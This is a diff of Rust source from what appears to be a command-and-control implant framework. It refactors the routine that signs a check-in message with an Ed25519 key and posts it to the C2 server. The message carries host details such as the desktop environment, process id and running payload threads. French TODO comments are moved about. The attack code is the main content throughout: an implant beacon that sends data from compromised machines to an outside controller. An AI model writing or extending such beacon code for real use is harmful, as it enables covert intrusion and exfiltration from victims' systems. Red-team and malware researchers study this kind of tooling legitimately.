@@ -16,6 +16,8 @@ use std::fs;
 use std::time::Duration;
 
 use crate::payload::Payload;
+use std::process;
+use ring::signature::{self, KeyPair};
 
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
@@ -425,9 +427,6 @@ pub struct PostToC2 {
     pub sign_bytes: Vec<u8>,
 }
 
-use std::process;
-use ring::signature::Ed25519KeyPair;
-use ring::signature::{self, KeyPair};
 
 impl LinkFetch for HTTPPostC2Link {
     fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
@@ -436,14 +435,12 @@ impl LinkFetch for HTTPPostC2Link {
     fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
     ) -> Result<Vec<u8>, anyhow::Error> {
 
-        let mut tt=vec![];
-        for i in running_thread{
-            tt.push(i.string_payload_compact());
+        let mut running_thread_string=vec![];
+        for thread in running_thread{
+            running_thread_string.push(thread.string_payload_compact());
         }
 
-        //TODO signature ici (sans faire via la config pour commencer)
-        let keypair = concat!(env!("HOME"), "/.malleable/config/ed25519.u8").to_string();
-        let key_pair = Config::fromfile_master_keypair(keypair.as_str());
+        let key_pair: signature::Ed25519KeyPair = signature::Ed25519KeyPair::from_pkcs8(config.loader_keypair.as_ref()).unwrap();
         let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
 
         let mut post_data: PostToC2 = PostToC2{
@@ -455,10 +452,9 @@ impl LinkFetch for HTTPPostC2Link {
             desktop_env: whoami::desktop_env().to_string(),
             pid: process::id(),
             data_operation: self.dataoperation.clone(),
-            running_thread: tt.clone(),
+            running_thread: running_thread_string.clone(),
             peer_public_key_bytes: peer_public_key_bytes.clone(),
             sign_bytes: vec![],
-            //running_thread: running_thread.clone(),
         };
 
         let sign_data = format!("sign_data: {:?}", post_data);
@@ -467,33 +463,18 @@ impl LinkFetch for HTTPPostC2Link {
         post_data.peer_public_key_bytes= peer_public_key_bytes;
         post_data.sign_bytes= sign_bytes;
 
-        //TODO attention, c'est avec la signature qu'on veut post_data
-        let post_data_bytes= serde_json::to_vec(&post_data).unwrap();
-        let m: Vec<u8>  = apply_all_dataoperations(&mut self.dataoperation_post.clone() , post_data_bytes).unwrap();
-
-
-
-
-
-        // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
-        //map.insert("config", format!("{:?}", config));
-        // TODO, il faudrait l'extraire de la config, on pourrait ajouter un nom a chaque config
-        //map.insert("loader", "todo".to_string());
-        //TODO send real data
-        //map.insert("working-link", "todo".to_string());
+        let post_data_bytes= serde_json::to_vec(&post_data)?;
+        let m: Vec<u8>  = apply_all_dataoperations(&mut self.dataoperation_post.clone() , post_data_bytes)?;
 
         let client = reqwest::blocking::Client::builder()
             .timeout(Duration::from_secs(config.link_timeout))
             .user_agent(&config.link_user_agent)
             .build()?;
 
-        //let mut res = client.post(&self.get_target()).json(&post_data).send()?;
         let mut res = client.post(&self.get_target()).body(m).send()?;
         let mut body: Vec<u8> = Vec::new();
         res.read_to_end(&mut body)?;
 
-        // TODO remove debug
-        //debug!("body:{}",std::str::from_utf8(&body).unwrap());
         Ok(body)
     }
 
@@ -510,3 +491,10 @@ impl LinkFetch for HTTPPostC2Link {
         self.jitt
     }
 }
+
+        // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
+        //map.insert("config", format!("{:?}", config));
+        // TODO, il faudrait l'extraire de la config, on pourrait ajouter un nom a chaque config
+        //map.insert("loader", "todo".to_string());
+        //TODO send real data
+        //map.insert("working-link", "todo".to_string());
